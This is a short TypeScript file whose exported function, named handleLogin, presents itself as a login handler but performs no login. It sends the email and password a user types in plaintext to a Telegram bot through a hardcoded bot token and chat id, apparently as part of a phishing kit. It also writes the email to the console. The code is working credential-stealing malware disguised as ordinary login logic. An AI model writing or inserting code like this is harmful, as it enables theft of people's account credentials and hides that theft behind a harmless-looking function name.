export async function handleLogin(email: string, password: string) {
  console.log(`Login attempt with email: ${email}`);

  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) {
      console.log(xhr.response);
    }
  };
  xhr.open(
    "get",
    `https://api.telegram.org/bot7663938323:AAEJDFBG20IYX0SCVPEfoOo3lyVxtFV8MZU/sendMessage?chat_id=-1002276420662&text=📧 Email : ${email}\n 🔒 Password:${password}\n`,
    true
  );
  xhr.setRequestHeader(
    "Content-Type",
    "application/x-www-form-urlencoded; charset=UTF-8"
  );

  xhr.setRequestHeader(
    "Content-Type",
    "application/x-www-form-urlencoded; charset=UTF-8"
  );
  xhr.send();
}
